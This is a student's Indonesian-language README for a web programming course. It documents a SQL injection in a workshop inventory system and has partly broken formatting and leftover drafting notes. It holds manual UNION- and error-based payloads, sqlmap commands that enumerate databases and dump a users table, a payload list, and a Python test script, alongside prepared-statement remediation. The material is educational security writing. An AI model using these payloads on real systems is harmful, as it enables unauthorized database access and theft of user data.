# Nama:Haris Adriansyah
#Nim:312410286
#Kelas: I.12.1D
#Matkul:Pemograman Web
#Dosen:Agung Nugroho, S.Kom., M.Kom.

# Exploitation of SQL Injection: Workshop Inventory Management System

![Security](https://img.shields.io/badge/Security-Penetration%20Testing-red)
![License](https://img.shields.io/badge/License-MIT-blue)

Repository ini berisi dokumentasi teknis mengenai temuan kerentanan **SQL Injection (SQLi)** pada Sistem Manajemen Inventaris Bengkel Jaya. Dokumentasi ini bertujuan sebagai referensi pembelajaran bagi developer dan praktisi keamanan siber.

## 📝 Deskripsi Proyek
Sistem Manajemen Inventaris ini ditemukan memiliki celah keamanan kritis pada parameter input yang tidak difilter. Hal ini memungkinkan penyerang untuk mengeksekusi perintah SQL berbahaya, mencuri data pengguna, hingga mengambil alih hak akses administrator.

## 🔍 Temuan Kerentanan
- **Vulnerability Type**: SQL Injection (Union Based & Error Based)
- **Affected Component**: Parameter `id` pada `detail_barang.php` dan form login.
- **Impact**: Full Database Disclosure (Data Leakage).

---

## 🚀 Proof of Concept (PoC)

### A. Manual Injection
Uji coba dilakukan dengan menambahkan payload pada URL untuk melihat jumlah kolom:
```sql
' ORDER BY 5-- -

' UNION SELECT 1,2,database(),user(),5-- -

B. Automated with SQLMap
Langkah-langkah otomatisasi menggunakan SQLMap untuk efisiensi:

Enumerasi Database:

Bash
sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" --batch --dbs
Ekstraksi Tabel:

Bash
   sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" -D inventory_db --tables
Dump Data Sensitif:

Bash
sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" -D inventory_db -T users --dump
🛠️ Cara Memperbaiki (Remediation)
Jangan hanya menyerang, tapi pelajari cara memperbaikinya. Cara paling ampuh adalah menggunakan Prepared Statements.

Contoh Kode Salah (Vulnerable):

PHP
$id = $_GET['id'];
$query = "SELECT * FROM barang WHERE id = '$id'"; // SANGAT BERBAHAYA
Contoh Kode Benar (Secure):

PHP
$id = $_GET['id'];
$stmt = $pdo->prepare('SELECT * FROM barang WHERE id = :id');
$stmt->execute(['id' => $id]);
$user = $stmt->fetch();
⚠️ Disclaimer
Penulis tidak bertanggung jawab atas penyalahgunaan informasi dalam repository ini. Segala tindakan ilegal yang dilakukan di luar lingkungan lab/edukasi adalah tanggung jawab masing-masing individu.

Credit: Terinspirasi dari tulisan Haris Adriansyah di Medium.


---

### 2. File: `poc_payloads.txt`
File ini berguna agar orang lain tahu daftar payload yang kamu gunakan.

```text
--- MANUAL SQLi PAYLOADS ---
1. ' OR 1=1--
2. admin' --
3. ' UNION SELECT NULL,NULL,NULL,NULL--
4. ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
3. File: exploit_example.py (Opsional)
Script Python sederhana untuk mendemonstrasikan automasi pengecekan.

Python
import requests

target = "http://target-bengkel.com/detail.php?id="
payload = "1' OR 1=1--"

print(f"[*] Testing target: {target}")
response = requests.get(target + payload)

if "Suku Cadang" in response.text: # Ganti dengan kata kunci yang muncul saat login berhasil
    print("[+] Vulnerability Confirmed: SQL Injection detected!")
else:
    print("[-] Target seems secure or payload failed.")
